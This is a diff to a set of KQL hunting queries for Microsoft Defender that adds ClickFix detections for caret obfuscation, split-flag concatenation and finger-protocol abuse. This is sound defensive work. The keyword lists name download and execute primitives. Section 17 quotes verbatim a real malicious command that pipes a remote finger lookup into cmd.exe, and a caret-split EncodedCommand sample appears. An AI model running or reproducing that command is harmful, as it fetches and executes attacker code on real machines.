@@ -273,15 +273,17 @@ hunt or an unusual network destination before escalating.
 
 ## 14. ClickFix fake CAPTCHA or verification phrase in script content
 
-Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.
+Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025. Phrase list and InitiatingProcessCommandLine coverage extended using a real detection pulled from this tenant, see below.
 
 ```kql
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
-| where isnotempty(ScriptContent)
-| where ScriptContent has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
-    and ScriptContent has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String')
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, ScriptContent, RuleName
+| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
+| where (ScriptContent has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Verify you are human', 'verify you are human', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
+        and ScriptContent has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String', 'finger'))
+    or (InitiatingProcessCommandLine has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Verify you are human', 'verify you are human', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
+        and InitiatingProcessCommandLine has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String', 'finger'))
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, ScriptContent, RuleName
 | order by Timestamp desc
 | take 10000
 ```
@@ -294,34 +296,154 @@ output rather than code. If that pasted text is ultimately captured as a
 script body, it is an extremely high fidelity signal, legitimate admin
 scripts essentially never contain this wording. Requiring an execution
 primitive alongside the phrase filters out unrelated documentation or help
-text. Validation note: the phrase and combo matching logic was confirmed
-against a known matching literal string, and returned 0 rows in the live
-window, a clean result consistent with no ClickFix activity in this
-tenant.
+text. Validation note: the phrase and combo logic was first confirmed
+against a synthetic literal string, then confirmed a second time against a
+real ClickFix detection pulled from this tenant's AlertEvidence table
+(AlertId `dab879c26d-f140-42c9-83bd-8a2cc293857e_1`, title "Suspicious
+'SuspClickFix' behavior was blocked"), which used the exact phrase "Verify
+you are human--press ENTER" alongside powershell and the finger command.
+That real sample is why the phrase list now includes "Verify you are
+human" and the combo list includes "finger", and why this checks
+InitiatingProcessCommandLine as well as ScriptContent, since a blocked
+ClickFix attempt may never reach the point of being captured as script
+content at all.
 
+## 15. ClickFix caret de-obfuscation and EncodedCommand decode
 
-Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.
+Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025 (Figure 28 describes LOLBin stacking and caret escape obfuscation, and the blog's own published hunting query uses a regex built around scrambled or caret-split spellings of the EncodedCommand flag).
 
 ```kql
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
-| where isnotempty(ScriptContent)
-| where ScriptContent has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
-    and ScriptContent has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String')
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, ScriptContent, RuleName
+| where isnotempty(InitiatingProcessCommandLine)
+| where InitiatingProcessCommandLine has '^'
+| extend Deobfuscated = replace_string(InitiatingProcessCommandLine, '^', '')
+| extend EncodedPortion = extract(@'(?i)-e[a-z]*\s+([A-Za-z0-9+/=]{20,})', 1, Deobfuscated)
+| extend DecodedCommand = iif(isnotempty(EncodedPortion), base64_decode_tostring(EncodedPortion), '')
+| where isnotempty(EncodedPortion)
+    or Deobfuscated has_any ('DownloadString', 'DownloadFile', 'IEX', 'Invoke-Expression', 'iwr ', 'Invoke-WebRequest', 'irm ', 'Invoke-RestMethod', 'FromBase64String')
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, Deobfuscated, EncodedPortion, DecodedCommand, RuleName
 | order by Timestamp desc
 | take 10000
 ```
 
-What it does and why: ClickFix landing pages decorate the clipboard payload
-with fake human verification text, such as a checkmark plus "I am not a
-robot", a bogus "Verification ID", or phrases like "Human verification" or
-"Cloud identificator", so the pasted command looks like normal CAPTCHA
-output rather than code. If that pasted text is ultimately captured as a
-script body, it is an extremely high fidelity signal, legitimate admin
-scripts essentially never contain this wording. Requiring an execution
-primitive alongside the phrase filters out unrelated documentation or help
-text. Validation note: the phrase and combo matching logic was confirmed
-against a known matching literal string, and returned 0 rows in the live
-window, a clean result consistent with no ClickFix activity in this
-tenant.
+What it does and why: this is the hunt in the set that actively reverses an
+obfuscation trick rather than just keyword matching around it. cmd.exe
+treats a caret before any character as an escape that is silently removed
+before the command runs, so an attacker can sprinkle carets almost
+anywhere in a command line to defeat literal string and simple regex
+matching while the pasted command still executes exactly as intended. This
+hunt requires a literal caret to be present on the command line (unusual
+on its own), strips every caret to recover the real text, then looks for
+an obfuscated EncodedCommand style flag, whether typed as -e, -en, -enc,
+or the full spelling, followed by a base64 blob, decodes that blob, and
+separately flags a download or execute primitive that only becomes
+visible once the carets are removed. Validation note: the full chain was
+proven with a synthetic caret-split payload
+(`powershell.exe -e^n^c JABwACAAPQAgAEcAZQB0...`), where the caret strip,
+flag extraction, and base64 decode correctly reproduced the real hidden
+command `$p = Get-MpPreference;`. The query returned 0 rows against live
+data, a genuine true negative since this tenant has no command lines
+containing a literal caret at all.
+
+## 16. ClickFix split-flag string concatenation
+
+Source: pattern confirmed against a real detection in this tenant's
+AlertEvidence table (AlertId `dab879c26d-f140-42c9-83bd-8a2cc293857e_1`,
+"Suspicious 'SuspClickFix' behavior was blocked"), which used
+`('-Windo' + 'wStyle') ('hid' + 'den')` to split `-WindowStyle` and
+`hidden` into two quoted fragments joined with `+`.
+
+```kql
+DeviceCustomScriptEvents
+| where Timestamp > ago(7d)
+| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
+| where (ScriptContent matches regex @'\(\s*''[\-A-Za-z]{2,}''\s*\+\s*''[\-A-Za-z]{2,}''\s*\)'
+        or ScriptContent matches regex @'\(\s*"[\-A-Za-z]{2,}"\s*\+\s*"[\-A-Za-z]{2,}"\s*\)')
+    or (InitiatingProcessCommandLine matches regex @'\(\s*''[\-A-Za-z]{2,}''\s*\+\s*''[\-A-Za-z]{2,}''\s*\)'
+        or InitiatingProcessCommandLine matches regex @'\(\s*"[\-A-Za-z]{2,}"\s*\+\s*"[\-A-Za-z]{2,}"\s*\)')
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ScriptContent, RuleName
+| order by Timestamp desc
+| take 10000
+```
+
+What it does and why: the existing heavy concatenation hunt (`ConcatHits
+>= 8`) missed this real sample entirely, it only has two `+` operators
+total, well under that threshold. This hunt instead catches the specific
+micro-pattern of a single quoted fragment, plus operator, second quoted
+fragment, inside parentheses, regardless of how many times it repeats, a
+lower threshold and more targeted companion aimed exactly at flag or
+cmdlet name fragmentation used to dodge literal keyword matching.
+Validation note: the regex was confirmed with `print` against the literal
+fragment `('-Windo' + 'wStyle')` pulled from the real detection, and
+returned 0 rows against live SOC-Central data, a clean result.
+
+## 17. ClickFix finger protocol abuse
+
+Source: pattern confirmed against the same real detection, whose command
+line was
+`"cmd.exe" /c start "" /min powershell -c "& powershell ('-Windo' + 'wStyle') ('hid' + 'den') -c finger mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe"`.
+
+```kql
+DeviceCustomScriptEvents
+| where Timestamp > ago(7d)
+| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
+| extend FingerMatchScript = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, ScriptContent)
+| extend FingerMatchCmdLine = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, InitiatingProcessCommandLine)
+| where isnotempty(FingerMatchScript) or isnotempty(FingerMatchCmdLine)
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FingerMatchCmdLine, FingerMatchScript, InitiatingProcessCommandLine, RuleName
+| order by Timestamp desc
+| take 10000
+```
+
+What it does and why: finger.exe is a living off the land binary that
+performs a lookup against a remote finger server on TCP port 79, a
+protocol rarely monitored or blocked by modern network controls. Threat
+actors abuse it as a covert retrieval channel, piping the response of a
+finger query shaped like `user@attacker-domain` straight into cmd.exe or
+powershell for execution. None of the other hunts in this set look for
+finger specifically, this closes that gap. Validation note: the regex was
+confirmed with `print` against the literal command text from the real
+detection, correctly isolating `finger mag@finger.captchamag.com`, and
+returned 0 rows against live SOC-Central data, a clean result.
+
+## 18. ClickFix detections already caught by Defender (AlertEvidence rollup)
+
+Table: `AlertEvidence`, not `DeviceCustomScriptEvents`. Discovered live in
+this tenant via `AlertEvidence | where Title contains "click"`, which
+surfaced a real alert, "Suspicious 'SuspClickFix' behavior was blocked"
+(AlertId `dab879c26d-f140-42c9-83bd-8a2cc293857e_1`, device DefCon30,
+2026-01-08). The underlying command never reached DeviceProcessEvents or
+DeviceCustomScriptEvents on that device, the attack was blocked by
+antivirus before a process or script content event was logged, so the
+only surviving evidence of the real malicious command line lived in
+AlertEvidence. This is why this hunt intentionally queries AlertEvidence
+rather than DeviceCustomScriptEvents, it is a necessary companion to
+hunts 1 through 17, which can only see ClickFix attempts that survived
+long enough to be captured as running script content or a running
+process.
+
+```kql
+AlertEvidence
+| where Timestamp > ago(30d)
+| where Title has_any ('SuspClickFix', 'ClickFix', 'MaleficAms', 'SuspDown', 'RegRunMRU')
+| project Timestamp, Title, EntityType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, RemoteUrl, RemoteIP, SHA256
+| order by Timestamp desc
+| take 10000
+```
+
+What it does and why: surfaces every alert whose title matches one of the
+named malware families Microsoft Defender uses for ClickFix related
+detections (SuspClickFix, ClickFix, MaleficAms, SuspDown, RegRunMRU),
+pulled straight from the blog's own list of applicable Microsoft Defender
+for Endpoint alert titles, with the full evidence row for each hit so an
+analyst does not have to pivot elsewhere to see what was actually blocked.
+Validation note: returned 3 real evidence rows for the one real ClickFix
+alert present in this tenant (user entity, process entity showing the
+full malicious command line with the finger.captchamag.com indicator, and
+machine entity for DefCon30), confirmed by temporarily widening the time
+filter to cover that January 2026 alert. With the 30 day production
+window above, a run today correctly returns 0 rows since that alert has
+aged out of the lookback, this is expected, widen the window when
+investigating older ClickFix history.
+
